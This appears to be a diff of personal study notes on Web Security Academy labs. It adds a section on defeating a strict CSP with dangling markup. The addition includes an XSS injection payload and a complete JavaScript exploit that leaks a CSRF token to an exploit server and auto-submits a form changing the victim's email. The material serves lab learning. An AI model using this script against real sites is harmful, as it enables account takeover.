@@ -12,7 +12,7 @@
 	(The script tag with the autosubmit has been removed and replaced with the image tag, which will set the cookie then submit the document). 
 - ==CSRF where token is duplicated in cookie== value in POST body. 
  ...
- \<input type="hidden" name="csrf" value="fake" />
+ `<input type="hidden" name="csrf" value="fake" />`
  ...
   Remove the auto-submit \<script> block and instead add the following code to inject the cookie and submit the form:
 
@@ -59,6 +59,57 @@ document.forms[0].submit();
   document.forms[0].submit();
 </script>
 ```
+
+- ==Reflected XSS protected by very strict CSP, with dangling markup attack==
+```
+  Use the browser DevTools to inspect the email input element. Notice that:
+
+You can change its type from email to text to bypass the client-side validation.
+Within the form there is a hidden input field that includes a CSRF token. This indicates that it is necessary for the email change process.
+Change the payload to foo@example.com"><img src= onerror=alert(1)>, embedding it
+
+
+
+<body>
+<script>
+// Define the URLs for the lab environment and the exploit server.
+const academyFrontend = "https://lab_id.web-security-academy.net/";
+const exploitServer = "https://exploit-exploit_id.exploit-server.net/exploit";
+
+// Extract the CSRF token from the URL.
+const url = new URL(location);
+const csrf = url.searchParams.get('csrf');
+
+// Check if a CSRF token was found in the URL.
+if (csrf) {
+    // If a CSRF token is present, create dynamic form elements to perform the attack.
+    const form = document.createElement('form');
+    const email = document.createElement('input');
+    const token = document.createElement('input');
+
+    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
+    token.name = 'csrf';
+    token.value = csrf;
+
+    // Configure the new email address intended to replace the user's current email.
+    email.name = 'email';
+    email.value = 'hacker@evil-user.net';
+
+    // Set the form attributes, append the form to the document, and configure it to automatically submit.
+    form.method = 'post';
+    form.action = `${academyFrontend}my-account/change-email`;
+    form.append(email);
+    form.append(token);
+    document.documentElement.append(form);
+    form.submit();
+
+    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
+} else {
+    location = `${academyFrontend}my-account?email=blah@blah.com%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
+}
+</script>
+</body>
+  ```
 
 ## Race Condition Vulnerabilities
 - ==Single-endpoint race conditions==
